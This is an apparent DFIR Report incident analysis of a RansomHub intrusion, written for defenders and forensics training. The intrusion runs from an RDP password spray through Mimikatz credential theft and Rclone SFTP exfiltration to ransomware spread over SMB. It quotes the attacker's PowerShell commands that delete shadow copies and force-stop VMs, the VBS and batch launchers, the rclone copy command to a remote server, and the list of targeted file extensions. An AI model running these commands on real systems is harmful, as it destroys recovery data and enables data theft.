			<h1 class="entry-title">Hide Your RDP: Password Spray Leads to RansomHub Deployment</h1>
		<div class="entry-meta">
			<span class="posted-on"><a href="https://thedfirreport.com/2025/06/30/hide-your-rdp-password-spray-leads-to-ransomhub-deployment/" rel="bookmark"><time class="entry-date published" datetime="2025-06-30T00:20:06+00:00">June 30, 2025</time></a></span>		</div><!-- .entry-meta -->

		
	</header><!-- .entry-header -->

	<div class="entry-content">
		
<h2 class="wp-block-heading">Key Takeaways</h2>



<ul class="wp-block-list">
<li>Initial access was via a password spray attack against an exposed RDP server, targeting numerous accounts over a four-hour period.</li>



<li>Mimikatz and Nirsoft were used to harvest credentials, with evidence of LSASS memory access.</li>



<li>Discovery was accomplished using living-off-the-land binaries as well as Advanced IP Scanner and NetScan.</li>



<li>Rclone was used to exfiltrate data to a remote server using SFTP.</li>



<li>The threat actor deployed RansomHub ransomware network wide, which spread over SMB and was executed using remote services.</li>
</ul>
<p>This case was featured in our June 2025 <a href="https://thedfirreport.com/services/dfir-labs/ctf/">DFIR Labs Forensics Challenge</a> and is available as a lab today <a href="https://store.thedfirreport.com/products/ransomhub-leads-to-domain-compromise-33490">here</a> for one time access or included in our new <a href="https://dfirlabs.thedfirreport.com/subscription-plans">subscription plan.</a> It was originally published as a Threat Brief to customers in Feb 2025.</p>
<h2 class="wp-block-heading">The DFIR Report Services</h2>
<p>

</p>

<h2 id="case-summary" class="wp-block-heading"><a href="#case-summary">Case Summary</a></h2>



<p>This intrusion began in November 2024 with a password spray attack targeting an internet-facing RDP server. Over the course of several hours, the threat actor attempted logins against multiple accounts using known malicious IPs (based on OSINT). Several hours later they then logged in via RDP with one of the previously compromised users and ran a series of discovery commands, including various <code>net</code> commands to enumerate users and computers. Credential access tools, specifically Mimikatz and <a href="https://www.nirsoft.net/utils/credentials_file_view.html" target="_blank" rel="noopener">Nirsoft CredentialsFileView</a>, were used to extract stored credentials and interact with LSASS memory.</p>



<p>Approximately two hours after initially authenticating to the beachhead host, the threat actor used RDP to move laterally to two domain controllers. Once on the domain controllers, they accessed the Windows Administrative Tools via the graphical user interface (GUI) to examine the DNS management console. Simultaneously, the threat actor continued to access additional servers and endpoints, conducting similar activities, namely reconnaissance via net commands and credential harvesting using Mimikatz throughout the environment. During this same time frame, Advanced IP Scanner was downloaded via the Microsoft Edge browser, and a network scan was initiated from the beachhead host.</p>



<p>The threat actor then continued lateral movement to additional hosts targeting backup servers, file servers, hypervisors, and more domain controllers. They utilized Mimikatz across several of these hosts outputting CSV files named for the child domains the hosts belonged to. Based on the logs we assess this activity was likely to confirm their pivot domain administrator account was present in the various domains. The threat actor concluded their operations for the day by viewing documents on various file shares after successfully gaining access to several high-value servers within the environment via RDP using their high-privileged account.</p>



<p>On the second day, they returned to the beachhead and reran Advanced IP Scanner and also SoftPerfect NetScan for broader network mapping. Later, Atera was installed via RDP on two backup servers, likely to maintain persistent remote access through legitimate administrative channels. The threat actor continued with another round of discovery.</p>



<p>On the start of the third day they employed Rclone to exfiltrate files over SFTP. The Rclone setup used helper scripts and was configured to include specific file types, such as documents, spreadsheets, emails, and image files. The transfer occurred over port 443, but the traffic was confirmed to be SFTP.</p>



<p>On the fifth day the threat actor returned via Splashtop installed on one of the backup servers. From there they performed another network sweep using Netscan. They then used RDP to connect to several hosts including domain controllers where several user passwords were reset. A little over an hour after becoming active again, now on the sixth day of the intrusion, the threat actor connected to a new server, ran another round of Netscan and then prepared for their ransomware deployment. They dropped the binary named amd64.exe and executed it on the host. This started a chain where files on the local host were encrypted but it also reached out to remote hosts to transfer a copy of the ransomware over SMB and then execute that file on the hosts using a remote service.</p>



<p>Once ran, the ransomware tried to kill any running virtual machines, setup permissive symlinks, delete shadow copies, and clear event logs. Following this, files were encrypted and a note linking the ransom to the RansomHub group was dropped. The Time to Ransomware (TTR) for this intrusion was around 118 hours over six calendar days.</p>

<h2 id="execution" class="wp-block-heading"><a href="#execution">Execution</a></h2>



<p>Throughout the attack we observed the execution of multiple threat actor controlled scripts and commands.</p>



<h4 class="wp-block-heading">Visual Basic</h4>



<p><code>nocmd.vbs</code> was executed as part of the exfiltration process using RClone. This Visual Basic script creates a WScript process that runs the RClone exfiltration batch script, <code>rcl.bat</code>. More details on this script will be explored on the <a href="#exfiltration">Exfiltration</a> section.</p>



<h4 class="wp-block-heading">Batch Script</h4>



<p><code>rcl.bat</code> was a batch script used to execute a RClone job. It receives further instructions on which files to exfiltrate from a file named <code>include.txt</code>. More details on this script will be explored on the <a href="#exfiltration">Exfiltration</a> section.</p>



<h4 class="wp-block-heading">PowerShell</h4>



<p>As part of the Ransomhub ransomware operation, numerous PowerShell commands were executed. More details on this will be explored on the <a href="#impact">Impact</a> section.</p>



<ol class="wp-block-list">
<li>To force shutdown VM in Hypervisor Servers</li>
</ol>



<pre class="wp-block-preformatted">powershell.exe -Command PowerShell -Command "{ Get-VM | where { $_.Name -ne 'VM01' -and $_.Name -ne 'VM02' } | Stop-VM -Force
</pre>



<ol class="wp-block-list">
<li>To remove volume shadow copy</li>
</ol>



<pre class="wp-block-preformatted">powershell.exe -Command PowerShell -Command "\"Get-CimInstance Win32_ShadowCopy | Remove-CimInstance\""
</pre>



<h4 class="wp-block-heading">Windows Command Shell</h4>



<p>As part of the Ransomhub ransomware operation, numerous Windows shell commands were executed. More details on this will be explored on the <a href="#impact">Impact</a> and <a href="#defense-evasion">Defense Evasion</a> sections.</p>
<p>The threat actor also executed common discovery commands such as <code>nslookup</code> , <code>net</code> and more. More details on this will be explored on the <a href="#discovery">Discovery</a> section.</p>



<h4 class="wp-block-heading">RDP Session Executions</h4>



<p>The threat actor leveraged their RDP session to interact directly with the desktop environment, as evidenced by the parent process explorer.exe launching tools and binaries like Mimikatz, CredentialsFileView, Advanced IP Scanner, and NetScan.</p>

<h2 id="credential-access" class="wp-block-heading"><a href="#credential-access">Credential Access</a></h2>



<p>As we observe in most of our intrusions, once the threat actor gained access to the RDP-exposed beachhead host via password spraying, they leveraged well-known credential harvesting tools, specifically Mimikatz and Nirsoft&#8217;s CredentialsFileView. These tools were deployed on compromised hosts to target different sources of stored credentials.</p>
<p><a href="https://i0.wp.com/thedfirreport.com/wp-content/uploads/2025/06/33490_011.png?ssl=1"><img data-recalc-dims="1" loading="lazy" decoding="async" class="aligncenter size-full wp-image-44671" src="https://i0.wp.com/thedfirreport.com/wp-content/uploads/2025/06/33490_011.png?resize=1170%2C747&#038;ssl=1" alt="" width="1170" height="747" srcset="https://i0.wp.com/thedfirreport.com/wp-content/uploads/2025/06/33490_011.png?w=1387&amp;ssl=1 1387w, https://i0.wp.com/thedfirreport.com/wp-content/uploads/2025/06/33490_011.png?resize=300%2C191&amp;ssl=1 300w, https://i0.wp.com/thedfirreport.com/wp-content/uploads/2025/06/33490_011.png?resize=1024%2C653&amp;ssl=1 1024w, https://i0.wp.com/thedfirreport.com/wp-content/uploads/2025/06/33490_011.png?resize=768%2C490&amp;ssl=1 768w" sizes="auto, (max-width: 1170px) 100vw, 1170px" /></a></p>





<p>On the beachhead host, we observed both tools being dropped on the Desktop of the compromised user. First CredentialsFileView was used to decrypt credential files stored on Windows systems, revealing saved passwords in plain text. This activity can be detected by Event ID 5379, indicating credential enumeration and read operations on stored credentials.</p>

<h2 id="discovery" class="wp-block-heading"><a href="#discovery">Discovery</a></h2>



<p>The threat actor leveraged a combination of living-off-the-land techniques and third party tools to perform discovery activities. They used built-in Windows commands such as <code>net</code> and <code>nltest</code> , third-party tools like Advanced IP Scanner and SoftPerfect&#8217;s NetScan, and Microsoft Management Console applets.</p>



<h4 class="wp-block-heading">The Classics, Living-off-the-land Commands</h4>
<p><a href="https://i0.wp.com/thedfirreport.com/wp-content/uploads/2025/06/33490_017.png?ssl=1"><img data-recalc-dims="1" loading="lazy" decoding="async" class="aligncenter size-full wp-image-44677" src="https://i0.wp.com/thedfirreport.com/wp-content/uploads/2025/06/33490_017.png?resize=1170%2C349&#038;ssl=1" alt="" width="1170" height="349" srcset="https://i0.wp.com/thedfirreport.com/wp-content/uploads/2025/06/33490_017.png?w=1843&amp;ssl=1 1843w, https://i0.wp.com/thedfirreport.com/wp-content/uploads/2025/06/33490_017.png?resize=300%2C90&amp;ssl=1 300w, https://i0.wp.com/thedfirreport.com/wp-content/uploads/2025/06/33490_017.png?resize=1024%2C306&amp;ssl=1 1024w, https://i0.wp.com/thedfirreport.com/wp-content/uploads/2025/06/33490_017.png?resize=768%2C229&amp;ssl=1 768w, https://i0.wp.com/thedfirreport.com/wp-content/uploads/2025/06/33490_017.png?resize=1536%2C458&amp;ssl=1 1536w" sizes="auto, (max-width: 1170px) 100vw, 1170px" /></a></p>





<p><em>Living-off-the-land discovery command sequence in the beachhead RDP server</em></p>



<p>The threat actor utilized these commands to perform discovery of the victim network:</p>



<ol class="wp-block-list">
<li><code>Nslookup</code> &#8211; Resolve internal domain name to identify domain controllers or DNS info</li>



<li><code>Net</code> &#8211; Enumerate user groups, domain accounts, computers, and password policy settings to identify privileged users and map the domain environment</li>



<li><code>Nltest</code> &#8211; Discover domain trust relationships to explore potential paths for lateral movement or cross-domain access.</li>



<li><code>Ipconfig</code> &#8211; Retrieve detailed network interface configuration to learn about the local host’s IP settings, DNS, and gateway</li>



<li><code>Route</code> &#8211; Display routing table to analyze reachable networks and plan pivoting or data exfiltration paths</li>



<li><code>Ping</code> &#8211; Test connectivity and resolve internal hostnames to identify active and reachable systems within the network</li>
</ol>



<p>Whenever the threat actor successfully logged in into a new endpoint, they performed the combinations of above commands over and over again.</p>
<p><a href="https://i0.wp.com/thedfirreport.com/wp-content/uploads/2025/06/33490_018.png?ssl=1"><img data-recalc-dims="1" loading="lazy" decoding="async" class="aligncenter size-full wp-image-44678" src="https://i0.wp.com/thedfirreport.com/wp-content/uploads/2025/06/33490_018.png?resize=1170%2C627&#038;ssl=1" alt="" width="1170" height="627" srcset="https://i0.wp.com/thedfirreport.com/wp-content/uploads/2025/06/33490_018.png?w=1847&amp;ssl=1 1847w, https://i0.wp.com/thedfirreport.com/wp-content/uploads/2025/06/33490_018.png?resize=300%2C161&amp;ssl=1 300w, https://i0.wp.com/thedfirreport.com/wp-content/uploads/2025/06/33490_018.png?resize=1024%2C549&amp;ssl=1 1024w, https://i0.wp.com/thedfirreport.com/wp-content/uploads/2025/06/33490_018.png?resize=768%2C412&amp;ssl=1 768w, https://i0.wp.com/thedfirreport.com/wp-content/uploads/2025/06/33490_018.png?resize=1536%2C823&amp;ssl=1 1536w" sizes="auto, (max-width: 1170px) 100vw, 1170px" /></a></p>

<h4 class="wp-block-heading">Microsoft Management Console (MMC)</h4>



<p>Microsoft Management Console (MMC) snap-ins are modular administrative tools that provide a graphical interface for managing Windows system components and services. Each snap-in, such as <code>dsa.msc</code> or <code>dssite.msc</code>, focuses on a specific area of system or directory management within a unified console environment. Once the threat actor compromised a domain admin account, they executed several MMC snap-ins on multiple Domain Controller (DC) servers.</p>

<h3 class="wp-block-heading">SMB</h3>



<p>On day six of the intrusion, the threat actor started preparing for the automated deployment of the ransomware payload throughout the network.</p>



<p>After the initial execution of the ransomware binary on a system, the spawned process began establishing connections with other internal systems. These network communications involved the transfer of the ransomware binary to remote hosts using the Server Message Block (SMB) protocol. Network analysis revealed evidence of SMB operations with random filenames, all having the same size, as observed below from Zeek.</p>
<p><a href="https://i0.wp.com/thedfirreport.com/wp-content/uploads/2025/06/33490_029.png?ssl=1"><img data-recalc-dims="1" loading="lazy" decoding="async" class="aligncenter size-full wp-image-44689" src="https://i0.wp.com/thedfirreport.com/wp-content/uploads/2025/06/33490_029.png?resize=1170%2C508&#038;ssl=1" alt="" width="1170" height="508" srcset="https://i0.wp.com/thedfirreport.com/wp-content/uploads/2025/06/33490_029.png?w=1391&amp;ssl=1 1391w, https://i0.wp.com/thedfirreport.com/wp-content/uploads/2025/06/33490_029.png?resize=300%2C130&amp;ssl=1 300w, https://i0.wp.com/thedfirreport.com/wp-content/uploads/2025/06/33490_029.png?resize=1024%2C445&amp;ssl=1 1024w, https://i0.wp.com/thedfirreport.com/wp-content/uploads/2025/06/33490_029.png?resize=768%2C333&amp;ssl=1 768w" sizes="auto, (max-width: 1170px) 100vw, 1170px" /></a></p>





<p>Confirmation of the ransomware&#8217;s presence on target systems can also be obtained by looking at file creation events, for instance looking at the <code>$MFT</code> or Sysmon Event ID 11. <h2 class="wp-block-heading" id="exfiltration"><a href="#exfiltration">Exfiltration</a></h2>



<p>During this intrusion, Rclone was utilized on multiple file servers to facilitate the exfiltration of data via SFTP. Rclone was dropped along with multiple helper files that aided its execution:</p>

<p>The <code>nocmd.vbs</code> file contained a set of VBS commands intended to execute the <code>rcl.bat</code> script.</p>



<pre class="wp-block-preformatted">Set WshShell = CreateObject("WScript.Shell")
WshShell.Run chr(34) &amp; "C:\ProgramData\Veeam\rcl.bat" &amp; Chr(34), 0
Set WshShell = Nothing
</pre>



<p><code>rcl.bat</code> was a Batch file containing the main command to execute the rclone executable.</p>



<pre class="wp-block-preformatted">rclone copy [REDACTED]:/mnt/sdd/REDACTED --include-from include.txt
</pre>



<p>Within the <code>includes.txt</code> was a set of file extensions that should be included for the exfiltration.</p>



<pre class="wp-block-preformatted">*.doc
*.docx
*.pdf
*.htm
*.html
*.xls
*.xlsx
*.jpg
*.jpeg
*.png
*.pst
*.msg

*.mbox
</pre>

<h4 class="wp-block-heading">Volume of Data Transferred:</h4>



<p>Analysis of <strong>Zeek logs</strong> revealed the total amount of data exfiltrated to the remote server. We used the source bytes field as this field counts the number of bytes sent from the source to the destination in a network connection. It measures the volume of data flowing from the initiator to the responder. By aggregating the <code>source.bytes</code>field and converting it to gigabytes using a Splunk query such as:</p>



<pre class="wp-block-preformatted">network.protocol=ssh "network.direction"!=internal | stats sum(source.bytes) as total_source_bytes | eval total_gb=round(total_source_bytes / 1000000000, 2)
</pre>



<p>The total amount of data transferred was calculated to be:</p>



<p class="is-layout-flow wp-block-quote-is-layout-flow"><strong>2.03 GB</strong></p>



<p>This volume aligns with the targeted exfiltration of data over a 40-minute time frame.</p>



<p>While no Sysmon file create events were observed for the Rclone configuration file, it was able be seen from the MFT and NTFS artifacts that can be extracted from memory.</p>
<p><a href="https://i0.wp.com/thedfirreport.com/wp-content/uploads/2025/06/33490_037.png?ssl=1"><img data-recalc-dims="1" loading="lazy" decoding="async" class="aligncenter size-full wp-image-44697" src="https://i0.wp.com/thedfirreport.com/wp-content/uploads/2025/06/33490_037.png?resize=717%2C803&#038;ssl=1" alt="" width="717" height="803" srcset="https://i0.wp.com/thedfirreport.com/wp-content/uploads/2025/06/33490_037.png?w=717&amp;ssl=1 717w, https://i0.wp.com/thedfirreport.com/wp-content/uploads/2025/06/33490_037.png?resize=268%2C300&amp;ssl=1 268w" sizes="auto, (max-width: 717px) 100vw, 717px" /></a></p>





<h2 id="impact" class="wp-block-heading"><a href="#impact">Impact</a></h2>



<p>On the sixth day the threat actor began the deployment of ransomware on the network with a ransomware binary named <code>amd64.exe</code>. We were able to observe again via the <code><strong>SPLog.txt</strong></code> log from Splashtop, that this was how the threat actor brought the ransomware binary into the environment and it also revealed the remote directories on the threat actors host where they had the file staged.</p>
<p><a href="https://i0.wp.com/thedfirreport.com/wp-content/uploads/2025/06/33490_038.png?ssl=1"><img data-recalc-dims="1" loading="lazy" decoding="async" class="aligncenter size-full wp-image-44698" src="https://i0.wp.com/thedfirreport.com/wp-content/uploads/2025/06/33490_038.png?resize=1170%2C142&#038;ssl=1" alt="" width="1170" height="142" srcset="https://i0.wp.com/thedfirreport.com/wp-content/uploads/2025/06/33490_038.png?w=1394&amp;ssl=1 1394w, https://i0.wp.com/thedfirreport.com/wp-content/uploads/2025/06/33490_038.png?resize=300%2C36&amp;ssl=1 300w, https://i0.wp.com/thedfirreport.com/wp-content/uploads/2025/06/33490_038.png?resize=1024%2C124&amp;ssl=1 1024w, https://i0.wp.com/thedfirreport.com/wp-content/uploads/2025/06/33490_038.png?resize=768%2C93&amp;ssl=1 768w" sizes="auto, (max-width: 1170px) 100vw, 1170px" /></a></p>

<p>The original ransomware executable was invoked directly via cmd.exe from a RDP session.</p>



<pre class="wp-block-preformatted">amd64.exe -pass [REDACTED]
</pre>



<p>Once the ransomware began execution it ran a set of commands that would stop any Hyper-V virtual machines running on the system, delete Shadow Copies, and events from a few Windows event channels. In addition, it leveraged built-in lateral movement capabilities to propagate to other hosts in the network through SMB, the <code>-only-local</code> flag was used to prevent a propagation loop for the ransomware. For the remote hosts, the ransomware was executed via a remote service, with random 6-letters name as image name and service name. This can be seen from event ID 7045 &#8211; Service Control Manager provider.</p>
